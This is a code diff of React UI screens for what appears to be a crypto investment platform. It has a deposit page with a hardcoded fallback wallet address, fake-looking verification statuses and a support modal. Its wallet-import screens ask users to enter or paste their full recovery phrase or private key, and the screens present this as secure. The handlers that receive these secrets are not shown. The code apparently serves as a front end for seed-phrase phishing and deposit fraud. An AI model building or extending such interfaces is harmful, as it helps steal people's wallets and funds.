+                      <div className="flex justify-between items-center py-0.5">
+                        <span className="text-[14px] font-medium text-[#A1A1AA]">Reference ID</span>
+                        <span className="text-[18px] font-medium text-white">
+                          {pendingDepositId || 'DEP-USDT-ERC20'}
+                        </span>
+                      </div>
+                      <div className="h-[1px] w-full bg-zinc-900/40" />
+
+                      {/* Selected Asset */}
+                      <div className="flex justify-between items-center py-0.5">
+                        <span className="text-[14px] font-medium text-[#A1A1AA]">Selected Asset</span>
+                        <span className="text-[18px] font-medium text-white">
+                          {selectedCrypto?.symbol || 'USDT'}
+                        </span>
+                      </div>
+                      <div className="h-[1px] w-full bg-zinc-900/40" />
+
+                      {/* Amount */}
+                      <div className="flex justify-between items-center py-0.5">
+                        <span className="text-[14px] font-medium text-[#A1A1AA]">Amount</span>
+                        <span className="text-[18px] font-medium text-white">
+                          ${amount ? Number(amount).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 }) : '10,000.00'} USD
+                        </span>
+                      </div>
+                      <div className="h-[1px] w-full bg-zinc-900/40" />
+
+                      {/* Exact Transfer Amount */}
+                      <div className="flex justify-between items-center py-0.5">
+                        <span className="text-[14px] font-medium text-[#A1A1AA]">Exact Amount</span>
+                        <div className="flex items-center gap-2">
+                          <span className="text-[18px] font-medium text-white">
+                            {formatExactAmount(exactCryptoAmount, selectedCrypto?.symbol || 'USDT')} {selectedCrypto?.symbol?.split('-')[0] || 'USDT'}
+                          </span>
+                          <button
+                            type="button"
+                            onClick={() => {
+                              navigator.clipboard.writeText(formatExactAmount(exactCryptoAmount, selectedCrypto?.symbol || 'USDT'));
+                              setCopiedExactAmount(true);
+                              setTimeout(() => setCopiedExactAmount(false), 2000);
+                            }}
+                            className="text-[#A1A1AA] hover:text-white transition-colors p-1"
+                            title="Copy Exact Amount"
+                          >
+                            {copiedExactAmount ? <Check className="w-4 h-4 text-emerald-500" /> : <Copy className="w-4 h-4" />}
+                          </button>
+                        </div>
+                      </div>
+                      <div className="h-[1px] w-full bg-zinc-900/40" />
+
+                      {/* Target Address */}
+                      <div className="flex justify-between items-center py-0.5">
+                        <span className="text-[14px] font-medium text-[#A1A1AA]">Target Address</span>
+                        <div className="flex items-center gap-2">
+                          <span className="text-[18px] font-medium text-white">
+                            {abbreviateAddress(selectedCrypto?.address || '0x8372A7eAde07B979333866544696aBbc6e49DF36')}
+                          </span>
+                          <button
+                            type="button"
+                            onClick={() => handleCopy(selectedCrypto?.address || '0x8372A7eAde07B979333866544696aBbc6e49DF36')}
+                            className="text-[#A1A1AA] hover:text-white transition-colors p-1"
+                            title="Copy Target Address"
+                          >
+                            {copiedAddress ? <Check className="w-4 h-4 text-emerald-500" /> : <Copy className="w-4 h-4" />}
+                          </button>
+                        </div>
+                      </div>
+                      <div className="h-[1px] w-full bg-zinc-900/40" />
+
+                      {/* Blockchain Network */}
+                      <div className="flex justify-between items-center py-0.5">
+                        <span className="text-[14px] font-medium text-[#A1A1AA]">Blockchain Network</span>
+                        <span className="text-[18px] font-medium text-white">
+                          {selectedCrypto?.network || 'Ethereum (ERC-20)'}
+                        </span>
+                      </div>
+                      <div className="h-[1px] w-full bg-zinc-900/40" />
+
+                      {/* Date & Time */}
+                      <div className="flex justify-between items-center py-0.5">
+                        <span className="text-[14px] font-medium text-[#A1A1AA]">Date & Time</span>
+                        <span className="text-[18px] font-medium text-white">
+                          {new Date().toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' })} at {createdTimeStr}
+                        </span>
+                      </div>
+                      <div className="h-[1px] w-full bg-zinc-900/40" />
+
+                      {/* Live Status */}
+                      <div className="flex justify-between items-center py-0.5">
+                        <span className="text-[14px] font-medium text-[#A1A1AA]">Live Status</span>
+                        <div className="flex items-center gap-2 text-[18px] font-medium text-white">
+                          <span className="w-2 h-2 rounded-full bg-white animate-pulse" />
+                          <span>
+                            {verificationStatusIndex === 0 ? 'Verifying' :
+                             verificationStatusIndex === 1 ? 'Awaiting Approval' : 'Processing'}
+                          </span>
+                        </div>
+                      </div>
+                      <div className="h-[1px] w-full bg-zinc-900/40" />
+                    </div>
+
+                  </div>
+
+                  {/* ACTION FOOTER */}
+                  <div className="px-6 pb-8 pt-4 shrink-0">
+                    <div className="max-w-md mx-auto w-full">
+                      <button
+                        type="button"
+                        onClick={() => setShowAssistanceModal(true)}
+                        className="w-full py-4 rounded-xl bg-white text-black font-semibold text-[15px] hover:bg-neutral-200 active:scale-[0.98] transition-all cursor-pointer flex items-center justify-center gap-2 shadow-lg"
+                      >
+                        I Have Made Payment
+                      </button>
+                    </div>
+                  </div>
+
+                  {/* ABANDON SESSION DIALOG */}
+                  {showAbandonModal && (
+                    <div className="fixed inset-0 z-[200] bg-black/80 backdrop-blur-sm flex items-center justify-center p-6 select-none font-sans">
+                      <div className="w-full max-w-sm rounded-2xl bg-[#000000] border border-zinc-800 p-6 space-y-6 text-white shadow-2xl">
+                        <div className="space-y-2 text-left">
+                          <h3 className="text-[20px] font-medium tracking-tight text-white leading-snug">
+                            Are you sure you want to abandon this session?
+                          </h3>
+                          <p className="text-[14px] text-[#A1A1AA] font-normal leading-relaxed">
+                            Any undetected tokens will be lost forever.
+                          </p>
+                        </div>
+                        
+                        <div className="flex flex-col gap-3">
+                          <button
+                            type="button"
+                            onClick={() => {
+                              localStorage.removeItem('aver_deposit_timer_target');
+                              localStorage.removeItem('aver_pending_deposit_id');
+                              setStep('methods');
+                              setShowAbandonModal(false);
+                            }}
+                            className="w-full py-3.5 rounded-xl bg-white text-black font-semibold text-[14px] hover:bg-neutral-200 transition cursor-pointer text-center"
+                          >
+                            Exit
+                          </button>
+                          <button
+                            type="button"
+                            onClick={() => setShowAbandonModal(false)}
+                            className="w-full py-3.5 rounded-xl bg-black border border-zinc-800 text-white font-semibold text-[14px] hover:bg-zinc-900 transition cursor-pointer text-center"
+                          >
+                            Stay
+                          </button>
+                        </div>
+                      </div>
+                    </div>
+                  )}
+
+                </div>
+              )}
+
+              {/* CRYSTAL CLEAR CRYPTO SUCCESS SCREEN */}
+              {step === 'crypto_success' && (
+                <div className="fixed inset-0 z-[100] bg-black text-white flex flex-col justify-center items-center p-6 select-none font-sans">
+                  <motion.div 
+                    initial={{ opacity: 0, scale: 0.95 }}
+                    animate={{ opacity: 1, scale: 1 }}
+                    className="flex flex-col items-center text-center space-y-4 max-w-sm"
+                  >
+                    <div className="w-12 h-12 rounded-full border border-white flex items-center justify-center text-white mb-2">
+                      <Check className="w-6 h-6 stroke-[1.5]" />
+                    </div>
+                    <h2 className="text-[38px] font-semibold tracking-tight text-white leading-tight">
+                      Deposit Approved
+                    </h2>
+                    <p className="text-[16px] text-[#A1A1AA] leading-relaxed">
+                      Your transfer has been verified successfully. Your available balance and portfolio metrics have been updated in real-time.
+                    </p>
+                    <p className="text-[14px] text-zinc-500 pt-4 animate-pulse">
+                      Redirecting to Home Dashboard...
+                    </p>
+                  </motion.div>
+                </div>
+              )}
+
+              {/* CRYSTAL CLEAR CRYPTO EXPIRED SCREEN */}
+              {step === 'crypto_expired' && (
+                <div className="fixed inset-0 z-[100] bg-black text-white flex flex-col justify-center items-center p-6 select-none font-sans">
+                  <motion.div 
+                    initial={{ opacity: 0, scale: 0.95 }}
+                    animate={{ opacity: 1, scale: 1 }}
+                    className="flex flex-col items-center text-center space-y-4 max-w-sm"
+                  >
+                    <div className="w-12 h-12 rounded-full border border-zinc-700 flex items-center justify-center text-zinc-400 mb-2">
+                      <X className="w-5 h-5 stroke-[1.5]" />
+                    </div>
+                    <h2 className="text-[38px] font-semibold tracking-tight text-white leading-tight">
+                      Session Expired
+                    </h2>
+                    <p className="text-[16px] text-[#A1A1AA] leading-relaxed">
+                      The deposit verification window has closed. Any transfers sent after expiration may require manual clearing.
+                    </p>
+                    <div className="pt-6 w-full">
+                      <button
+                        type="button"
+                        onClick={() => {
+                          localStorage.removeItem('aver_deposit_timer_target');
+                          localStorage.removeItem('aver_pending_deposit_id');
+                          setStep('methods');
+                        }}
+                        className="w-full py-3.5 rounded-xl bg-white text-black font-semibold text-[14px] hover:bg-neutral-200 transition"
+                      >
+                        Return to Funding Methods
+                      </button>
+                    </div>
+                  </motion.div>
+                </div>
+              )}
+
+              {/* RECOVERY PHRASE INFO MODAL */}
+              {showRecoveryInfoModal && (
+                <div className="fixed inset-0 z-[100] bg-black/80 backdrop-blur-sm flex items-center justify-center p-4 select-none font-sans">
+                  <div className="w-full max-w-sm rounded-2xl bg-black border border-white/20 p-6 space-y-6 text-white shadow-2xl">
+                    <div className="space-y-2 text-left">
+                      <h3 className="text-xl font-semibold tracking-tight text-white flex items-center gap-2">
+                        <HelpCircle className="w-5 h-5 text-emerald-400" />
+                        Recovery Phrase
+                      </h3>
+                      <p className="text-[14px] text-neutral-400 font-normal leading-relaxed">
+                        Enter your 12 or 24-word recovery phrase separated by spaces (e.g. apple banana cherry...). This phrase acts as a master key to securely restore and link your wallet connection to our platform.
+                      </p>
+                    </div>
+                    
+                    <div className="flex items-center gap-3 pt-2">
+                      <button
+                        type="button"
+                        onClick={() => setShowRecoveryInfoModal(false)}
+                        className="flex-1 py-3.5 rounded-xl bg-white/5 border border-white/10 text-neutral-300 font-semibold text-sm hover:bg-white/10 transition cursor-pointer"
+                      >
+                        Cancel
+                      </button>
+                      <button
+                        type="button"
+                        onClick={() => setShowRecoveryInfoModal(false)}
+                        className="flex-1 py-3.5 rounded-xl bg-emerald-500 text-black font-semibold text-sm hover:bg-emerald-400 transition cursor-pointer"
+                      >
+                        I Understand
+                      </button>
+                    </div>
+                  </div>
+                </div>
+              )}
+
+              {/* PRIVATE KEY INFO MODAL */}
+              {showPrivateKeyInfoModal && (
+                <div className="fixed inset-0 z-[100] bg-black/80 backdrop-blur-sm flex items-center justify-center p-4 select-none font-sans">
+                  <div className="w-full max-w-sm rounded-2xl bg-black border border-white/20 p-6 space-y-6 text-white shadow-2xl">
+                    <div className="space-y-2 text-left">
+                      <h3 className="text-xl font-semibold tracking-tight text-white flex items-center gap-2">
+                        <HelpCircle className="w-5 h-5 text-indigo-400" />
+                        Private Key
+                      </h3>
+                      <p className="text-[14px] text-neutral-400 font-normal leading-relaxed">
+                        Enter or paste your 64-character private key (e.g. 0x4f3a...). Your private key provides direct, secure access to your wallet and is used to establish a link.
+                      </p>
+                    </div>
+                    
+                    <div className="flex items-center gap-3 pt-2">
+                      <button
+                        type="button"
+                        onClick={() => setShowPrivateKeyInfoModal(false)}
+                        className="flex-1 py-3.5 rounded-xl bg-white/5 border border-white/10 text-neutral-300 font-semibold text-sm hover:bg-white/10 transition cursor-pointer"
+                      >
+                        Cancel
+                      </button>
+                      <button
+                        type="button"
+                        onClick={() => setShowPrivateKeyInfoModal(false)}
+                        className="flex-1 py-3.5 rounded-xl bg-indigo-500 text-black font-semibold text-sm hover:bg-indigo-400 transition cursor-pointer"
+                      >
+                        I Understand
+                      </button>
+                    </div>
+                  </div>
+                </div>
+              )}
+
+              {/* COMPACT REDESIGNED ASSISTANCE MODAL */}
+              {showAssistanceModal && (
+                <div className="fixed inset-0 z-[200] bg-black/80 backdrop-blur-sm flex items-center justify-center p-6 select-none font-sans">
+                  <div className="w-full max-w-sm rounded-2xl bg-[#000000] border border-zinc-800 p-6 space-y-6 text-white shadow-2xl">
+                    <div className="space-y-2 text-left">
+                      <h3 className="text-[20px] font-medium tracking-tight text-white">
+                        Payment Already Sent?
+                      </h3>
+                      <p className="text-[14px] text-[#A1A1AA] font-normal leading-relaxed">
+                        If you have already completed your blockchain transfer but your deposit has not yet been credited, our support team can review your transaction and assist you if necessary. Deposits are only credited after successful verification and approval.
+                      </p>
+                    </div>
+
+                    <div className="space-y-3 pt-2">
+                      <button
+                        type="button"
+                        onClick={() => {
+                          setShowAssistanceModal(false);
+                          if (onOpenSupport) {
+                            const ticketId = `DEP-SUP-${Math.floor(100000 + Math.random() * 900000)}`;
+                            const newTicket = {
+                              id: ticketId,
+                              userId: auth.currentUser?.uid || 'guest_user',
+                              userEmail: auth.currentUser?.email || '',
+                              userName: auth.currentUser?.displayName || 'Trader',
+                              title: `Deposit Review: ${amount} ${selectedCrypto?.symbol || 'USDT'}`,
+                              category: 'Deposits & Wallet',
+                              description: supportDraftMessage,
+                              status: 'open' as const,
+                              priority: 'high' as const,
+                              transactionId: pendingDepositId || 'DEP-USDT-ERC20',
+                              createdAt: new Date().toISOString(),
+                              updatedAt: new Date().toISOString(),
+                              messages: [
+                                {
+                                  id: `msg-${Date.now()}`,
+                                  sender: auth.currentUser?.displayName || 'Trader',
+                                  senderRole: 'user' as const,
+                                  text: `${supportDraftMessage}\n\n[Transaction Details]\n• Reference ID: ${pendingDepositId || 'DEP-USDT-ERC20'}\n• Asset: ${selectedCrypto?.symbol || 'USDT'}\n• Network: ${selectedCrypto?.network || 'USDT-ERC20'}\n• Amount: ${amount} ${selectedCrypto?.symbol || 'USDT'}\n• Wallet Address: ${selectedCrypto?.address || connectedAddress}\n• Created: ${new Date().toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' })} at ${createdTimeStr}\n• Status: Verifying\n• Remaining Time: ${Math.floor(verificationSecondsLeft / 60).toString().padStart(2, '0')}:${(verificationSecondsLeft % 60).toString().padStart(2, '0')}`,
+                                  timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
+                                  status: 'delivered' as const
+                                }
+                              ]
+                            };
+                            onOpenSupport(newTicket);
+                          }
+                        }}
+                        className="w-full py-3.5 rounded-xl bg-white text-black font-semibold text-[14px] hover:bg-neutral-200 transition cursor-pointer text-center"
+                      >
+                        Contact Support
+                      </button>
+
+                      <button
+                        type="button"
+                        onClick={() => setShowAssistanceModal(false)}
+                        className="w-full py-3.5 rounded-xl bg-black border border-zinc-800 text-white font-semibold text-[14px] hover:bg-zinc-900 transition cursor-pointer text-center"
+                      >
+                        Close
+                      </button>
+                    </div>
+
+                    <p className="text-[12px] text-[#A1A1AA] text-center">
+                      Your current verification session will continue running in the background.
+                    </p>
+                  </div>
+                </div>
+              )}
+
+              {/* CHOOSE IMPORT METHOD FULL SCREEN */}
+              {step === 'wallet_import_choose' && (
+                <motion.div 
+                  key="wallet_import_choose"
+                  initial={{ opacity: 0, scale: 0.98 }}
+                  animate={{ opacity: 1, scale: 1 }}
+                  exit={{ opacity: 0, scale: 0.98 }}
+                  className="relative w-full rounded-[32px] bg-neutral-950 text-white p-6 sm:p-10 overflow-hidden ring-1 ring-white/10 shadow-2xl space-y-8 min-h-[540px] flex flex-col justify-between"
+                >
+                  {/* Cancel Button Top Left */}
+                  <div className="flex items-center justify-between relative z-10 pt-2">
+                    <button 
+                      type="button"
+                      onClick={() => setStep('form')}
+                      className="flex h-7 w-7 items-center justify-center rounded-full bg-white/10 hover:bg-white/20 transition cursor-pointer"
+                      title="Cancel"
+                    >
+                      <X className="h-3.5 w-3.5 text-white" />
+                    </button>
+                    <div className="w-7" />
+                  </div>
+
+                  {/* Top Illustration & Title — Import Custom Wallets */}
+                  <div className="space-y-2 text-center max-w-lg mx-auto relative z-10 pt-2 pb-2 flex flex-col items-center">
+                    <ImportWalletAnimatedLogo icon={Wallet} colorClass="text-emerald-400" />
+                    <h2 className="text-2xl sm:text-3xl font-black tracking-tight text-white">
+                      Import Custom Wallets
+                    </h2>
+                    <p className="text-xs sm:text-sm text-neutral-400 leading-relaxed max-w-md mx-auto">
+                      Choose your preferred authorization method to securely connect and restore your self-custody wallet into the system.
+                    </p>
+                  </div>
+
+                  {/* Selection Cards */}
+                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4 max-w-2xl mx-auto w-full relative z-10">
+                    {/* Option 1 — Recovery Phrase */}
+                    <button
+                      type="button"
+                      onClick={() => setStep('wallet_import_phrase')}
+                      className="group relative p-6 rounded-3xl bg-neutral-900/90 border border-white/10 hover:border-emerald-500/50 hover:bg-neutral-900 text-left transition-all duration-300 hover:-translate-y-1 shadow-xl hover:shadow-2xl hover:shadow-emerald-950/50 flex flex-col justify-between space-y-4 cursor-pointer"
+                    >
+                      <div className="flex items-center justify-between">
+                        <div className="w-12 h-12 rounded-2xl bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-center text-emerald-400 group-hover:scale-110 transition-transform">
+                          <Shield className="w-6 h-6 text-emerald-400" />
+                        </div>
+                        <span className="text-[10px] font-mono font-bold uppercase tracking-wider text-emerald-400 bg-emerald-500/10 px-2.5 py-1 rounded-full border border-emerald-500/20">
+                          Recommended
+                        </span>
+                      </div>
+
+                      <div className="space-y-1.5">
+                        <h3 className="text-lg font-bold text-white group-hover:text-emerald-300 transition-colors flex items-center justify-between">
+                          <span>Recovery Phrase</span>
+                          <ChevronRight className="w-4 h-4 text-neutral-500 group-hover:translate-x-1 transition-transform" />
+                        </h3>
+                        <p className="text-xs text-neutral-400 leading-relaxed">
+                          Import your wallet using your recovery (seed) phrase. This is the recommended method for restoring an existing wallet.
+                        </p>
+                      </div>
+                    </button>
+
+                    {/* Option 2 — Private Key */}
+                    <button
+                      type="button"
+                      onClick={() => setStep('wallet_import_key')}
+                      className="group relative p-6 rounded-3xl bg-neutral-900/90 border border-white/10 hover:border-indigo-500/50 hover:bg-neutral-900 text-left transition-all duration-300 hover:-translate-y-1 shadow-xl hover:shadow-2xl hover:shadow-indigo-950/50 flex flex-col justify-between space-y-4 cursor-pointer"
+                    >
+                      <div className="flex items-center justify-between">
+                        <div className="w-12 h-12 rounded-2xl bg-indigo-500/10 border border-indigo-500/30 flex items-center justify-center text-indigo-400 group-hover:scale-110 transition-transform">
+                          <Key className="w-6 h-6 text-indigo-400" />
+                        </div>
+                        <span className="text-[10px] font-mono font-bold uppercase tracking-wider text-indigo-400 bg-indigo-500/10 px-2.5 py-1 rounded-full border border-indigo-500/20">
+                          Direct Key
+                        </span>
+                      </div>
+
+                      <div className="space-y-1.5">
+                        <h3 className="text-lg font-bold text-white group-hover:text-indigo-300 transition-colors flex items-center justify-between">
+                          <span>Private Key</span>
+                          <ChevronRight className="w-4 h-4 text-neutral-500 group-hover:translate-x-1 transition-transform" />
+                        </h3>
+                        <p className="text-xs text-neutral-400 leading-relaxed">
+                          Import your wallet using the private key associated with your wallet address.
+                        </p>
+                      </div>
+                    </button>
+                  </div>
+
+                  <div className="text-center text-[11px] text-neutral-500">
+                    Protected by 256-bit client-side cryptographic hashing protocols
+                  </div>
+                </motion.div>
+              )}
+
+              {/* RECOVERY PHRASE IMPORT FULL SCREEN */}
+              {step === 'wallet_import_phrase' && (
+                <motion.div 
+                  key="wallet_import_phrase"
+                  initial={{ opacity: 0, scale: 0.98 }}
+                  animate={{ opacity: 1, scale: 1 }}
+                  exit={{ opacity: 0, scale: 0.98 }}
+                  className="relative w-full rounded-[32px] bg-neutral-950 text-white p-6 sm:p-10 overflow-hidden ring-1 ring-white/10 shadow-2xl space-y-6"
+                >
+                  {/* Header */}
+                  <div className="flex items-center justify-between relative z-10 pt-2">
+                    <button 
+                      type="button"
+                      onClick={() => setStep('wallet_import_choose')}
+                      className="flex h-7 w-7 items-center justify-center rounded-full bg-white/10 hover:bg-white/20 transition cursor-pointer"
+                      title="Close"
+                    >
+                      <X className="h-3.5 w-3.5 text-white" />
+                    </button>
+                    <div />
+                    <div className="w-7" />
+                  </div>
+
+                  {/* Hero Header */}
+                  <div className="space-y-3 text-center max-w-lg mx-auto relative z-10 flex flex-col items-center">
+                    <ImportWalletAnimatedLogo icon={ShieldCheck} colorClass="text-emerald-400" />
+
+                    <div className="space-y-1.5">
+                      <h2 className="text-2xl sm:text-3xl font-bold tracking-tight text-white">
+                        Import Using Recovery Phrase
+                      </h2>
+                      <p className="text-xs sm:text-sm text-neutral-400 leading-relaxed max-w-md mx-auto">
+                        Enter your 12 or 24-word recovery phrase to restore your wallet connection securely.
+                      </p>
+                    </div>
+                  </div>
+
+                  {/* Form Body */}
+                  <form onSubmit={handleImportRecoveryPhraseSubmit} className="space-y-5 max-w-2xl mx-auto w-full relative z-10">
+                    <div className="space-y-2">
+                      <div className="flex items-center justify-between text-xs">
+                        <label className="font-bold tracking-wider text-neutral-300 uppercase flex items-center gap-2">
+                          <span>Recovery Phrase</span>
+                        </label>
+                        <div className="flex items-center gap-2">
+                          <span className={`text-[11px] font-mono px-2 py-0.5 rounded-md font-bold ${
+                            validatePhrase(importPhrase).valid 
+                              ? 'bg-emerald-500/10 border border-emerald-500/30 text-emerald-400' 
+                              : 'bg-white/5 border border-white/10 text-neutral-400'
+                          }`}>
+                            Word Count: {getPhraseWords(importPhrase).length}
+                          </span>
+                          <button
+                            type="button"
+                            onClick={() => setShowRecoveryInfoModal(true)}
+                            className="p-1 rounded-full text-neutral-500 hover:text-white hover:bg-white/10 transition-colors"
+                            title="Help"
+                          >
+                            <HelpCircle className="w-4 h-4" />
+                          </button>
+                        </div>
+                      </div>
+
+                      <div className="relative">
+                        <textarea
+                          rows={4}
+                          value={importPhrase}
+                          onChange={(e) => setImportPhrase(e.target.value)}
+                          placeholder=""
+                          style={!showPhrase ? { WebkitTextSecurity: 'disc' } as any : {}}
+                          className={`w-full font-mono text-xs sm:text-sm text-white bg-neutral-900 rounded-2xl p-4 pr-24 outline-none border transition-all leading-relaxed resize-none ${
+                            validatePhrase(importPhrase).valid
+                              ? 'border-emerald-500/60 ring-2 ring-emerald-500/30 bg-emerald-950/10 text-emerald-100'
+                              : importPhrase.trim()
+                              ? 'border-indigo-500/40 focus:border-indigo-500 ring-1 ring-indigo-500/20'
+                              : 'border-white/10 focus:border-indigo-500'
+                          }`}
+                        />
+
+                        {/* Action Tools Inside Input */}
+                        <div className="absolute right-3 top-3 flex flex-col gap-2">
+                          <button
+                            type="button"
+                            onClick={() => setShowPhrase(!showPhrase)}
+                            className="p-2 rounded-xl bg-white/5 border border-white/10 hover:bg-white/10 active:scale-95 transition text-neutral-300 hover:text-white cursor-pointer"
+                            title={showPhrase ? "Hide Phrase" : "Show Phrase"}
+                          >
+                            {showPhrase ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
+                          </button>
+                          <button
+                            type="button"
+                            onClick={handlePastePhraseFromClipboard}
+                            className="p-2 rounded-xl bg-white/5 border border-white/10 hover:bg-white/10 active:scale-95 transition text-emerald-400 cursor-pointer"
+                            title="Paste from Clipboard"
+                          >
+                            <Copy className="w-4 h-4" />
+                          </button>
+                        </div>
+                      </div>
+
+                      {/* Live Validation Badge */}
+                      {validatePhrase(importPhrase).valid && (
+                        <motion.div 
+                          initial={{ opacity: 0, y: -4 }}
+                          animate={{ opacity: 1, y: 0 }}
+                          className="p-3 rounded-xl bg-emerald-950/40 border border-emerald-500/40 text-emerald-300 text-xs flex items-center justify-between"
+                        >
+                          <div className="flex items-center gap-2">
+                            <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0" />
+                            <span className="font-semibold">Valid {getPhraseWords(importPhrase).length}-word recovery phrase verified</span>
+                          </div>
+                          <span className="font-mono text-[10px] text-emerald-400">Ready</span>
+                        </motion.div>
+                      )}
+                    </div>
+
+                    {/* Security Notice */}
+                    <div className="p-4 rounded-2xl bg-neutral-900/80 border border-white/10 flex items-start gap-3.5 text-xs text-neutral-300">
+                      <div className="p-2 rounded-xl bg-amber-500/10 border border-amber-500/20 text-amber-400 shrink-0 mt-0.5">
+                        <ShieldAlert className="w-4 h-4" />
+                      </div>
+                      <div className="space-y-1 text-left">
+                        <h5 className="font-bold text-white text-xs">Security Notice</h5>
+                        <p className="text-[11px] text-neutral-400 leading-relaxed">
+                          Enter only the recovery phrase of a wallet you own. Never share your seed phrase with anyone. Support agents will never ask for your recovery phrase.
+                        </p>
+                      </div>
+                    </div>
+
+                    {/* Pinned Import Button */}
+                    <div className="pt-3 border-t border-white/10">
+                      <button
+                        type="submit"
+                        disabled={!validatePhrase(importPhrase).valid}
+                        className={`w-full rounded-2xl py-4 text-sm font-bold text-slate-950 shadow-xl transition-all flex items-center justify-center gap-2 ${
+                          validatePhrase(importPhrase).valid
+                            ? 'bg-gradient-to-r from-emerald-500 via-emerald-400 to-teal-400 hover:from-emerald-400 hover:to-teal-300 shadow-emerald-500/30 active:scale-[0.98] cursor-pointer'
+                            : 'bg-neutral-800 text-neutral-500 border border-white/5 cursor-not-allowed opacity-60'
+                        }`}
+                      >
+                        <Shield className="w-4 h-4" />
+                        <span>Import Wallet</span>
+                        <ChevronRight className="w-4 h-4" />
+                      </button>
+                    </div>
+                  </form>
+                </motion.div>
+              )}
+
+              {/* PRIVATE KEY IMPORT FULL SCREEN */}
+              {step === 'wallet_import_key' && (
+                <motion.div 
+                  key="wallet_import_key"
+                  initial={{ opacity: 0, scale: 0.98 }}
+                  animate={{ opacity: 1, scale: 1 }}
+                  exit={{ opacity: 0, scale: 0.98 }}
+                  className="relative w-full rounded-[32px] bg-neutral-950 text-white p-6 sm:p-10 overflow-hidden ring-1 ring-white/10 shadow-2xl space-y-6"
+                >
+                  {/* Header */}
+                  <div className="flex items-center justify-between relative z-10 pt-2">
+                    <button 
+                      type="button"
+                      onClick={() => setStep('wallet_import_choose')}
+                      className="flex h-7 w-7 items-center justify-center rounded-full bg-white/10 hover:bg-white/20 transition cursor-pointer"
+                      title="Close"
+                    >
+                      <X className="h-3.5 w-3.5 text-white" />
+                    </button>
+                    <div />
+                    <div className="w-7" />
+                  </div>
+
+                  {/* Hero Header */}
+                  <div className="space-y-3 text-center max-w-lg mx-auto relative z-10 flex flex-col items-center">
+                    <ImportWalletAnimatedLogo icon={Key} colorClass="text-indigo-400" />
+
+                    <div className="space-y-1.5">
+                      <h2 className="text-2xl sm:text-3xl font-bold tracking-tight text-white">
+                        Import Using Private Key
+                      </h2>
+                      <p className="text-xs sm:text-sm text-neutral-400 leading-relaxed max-w-md mx-auto">
+                        Enter your wallet private key to restore your wallet address into the application securely.
+                      </p>
+                    </div>
+                  </div>
+
+                  {/* Form Body */}
+                  <form onSubmit={handleImportPrivateKeySubmit} className="space-y-5 max-w-2xl mx-auto w-full relative z-10">
+                    <div className="space-y-2">
+                      <div className="flex items-center justify-between text-xs">
+                        <label className="font-bold tracking-wider text-neutral-300 uppercase flex items-center gap-2">
+                          <span>Private Key</span>
+                        </label>
+                        <div className="flex items-center gap-2">
+                          <button
+                            type="button"
+                            onClick={() => setShowPrivateKeyInfoModal(true)}
+                            className="p-1 rounded-full text-neutral-500 hover:text-white hover:bg-white/10 transition-colors"
+                            title="Help"
+                          >
+                            <HelpCircle className="w-4 h-4" />
+                          </button>
+                        </div>
+                      </div>
+
+                      <div className="relative">
+                        <input
+                          type={showKey ? 'text' : 'password'}
+                          value={importKey}
+                          onChange={(e) => setImportKey(e.target.value)}
+                          placeholder=""
+                          className={`w-full font-mono text-xs sm:text-sm text-white bg-neutral-900 rounded-2xl p-4 pr-24 outline-none border transition-all ${
+                            validatePrivateKey(importKey).valid
+                              ? 'border-emerald-500/60 ring-2 ring-emerald-500/30 bg-emerald-950/10 text-emerald-100'
+                              : importKey.trim()
+                              ? 'border-rose-500/40 focus:border-rose-500 ring-1 ring-rose-500/20'
+                              : 'border-white/10 focus:border-indigo-500'
+                          }`}
+                        />
+
+                        {/* Quick Actions */}
+                        <div className="absolute right-3 top-1/2 -translate-y-1/2 flex items-center gap-1.5">
+                          <button
+                            type="button"
+                            onClick={() => setShowKey(!showKey)}
+                            className="p-2 rounded-xl bg-white/5 border border-white/10 hover:bg-white/10 active:scale-95 transition text-neutral-300 hover:text-white cursor-pointer"
+                            title={showKey ? "Hide Private Key" : "Show Private Key"}
+                          >
+                            {showKey ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
+                          </button>
+                          <button
+                            type="button"
+                            onClick={handlePasteKeyFromClipboard}
+                            className="p-2 rounded-xl bg-white/5 border border-white/10 hover:bg-white/10 active:scale-95 transition text-indigo-400 cursor-pointer"
+                            title="Paste from Clipboard"
+                          >
+                            <Copy className="w-4 h-4" />
+                          </button>
+                        </div>
+                      </div>
+
+                      {/* Live Validation Badge */}
+                      {validatePrivateKey(importKey).valid && (
+                        <motion.div 
+                          initial={{ opacity: 0, y: -4 }}
+                          animate={{ opacity: 1, y: 0 }}
+                          className="p-3 rounded-xl bg-emerald-950/40 border border-emerald-500/40 text-emerald-300 text-xs flex items-center justify-between"
+                        >
+                          <div className="flex items-center gap-2">
+                            <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0" />
+                            <span className="font-semibold">Valid 64-character private key format verified</span>
+                          </div>
+                          <span className="font-mono text-[10px] text-emerald-400">Ready</span>
+                        </motion.div>
+                      )}
+                    </div>
+
+                    {/* Security Notice */}
+                    <div className="p-4 rounded-2xl bg-neutral-900/80 border border-white/10 flex items-start gap-3.5 text-xs text-neutral-300">
+                      <div className="p-2 rounded-xl bg-amber-500/10 border border-amber-500/20 text-amber-400 shrink-0 mt-0.5">
+                        <ShieldAlert className="w-4 h-4" />
+                      </div>
+                      <div className="space-y-1 text-left">
+                        <h5 className="font-bold text-white text-xs">Critical Security Notice</h5>
+                        <p className="text-[11px] text-neutral-400 leading-relaxed">
+                          Never share your private key with anyone and import only wallets you own. Anyone with access to your private key has full control over your assets.
+                        </p>
+                      </div>
+                    </div>
+
+                    {/* Pinned Import Button */}
+                    <div className="pt-3 border-t border-white/10">
+                      <button
+                        type="submit"
+                        disabled={!validatePrivateKey(importKey).valid}
+                        className={`w-full rounded-2xl py-4 text-sm font-bold text-white shadow-xl transition-all flex items-center justify-center gap-2 ${
+                          validatePrivateKey(importKey).valid
+                            ? 'bg-gradient-to-r from-indigo-600 via-indigo-500 to-purple-600 hover:from-indigo-500 hover:to-purple-500 shadow-indigo-600/30 active:scale-[0.98] cursor-pointer'
+                            : 'bg-neutral-800 text-neutral-500 border border-white/5 cursor-not-allowed opacity-60'
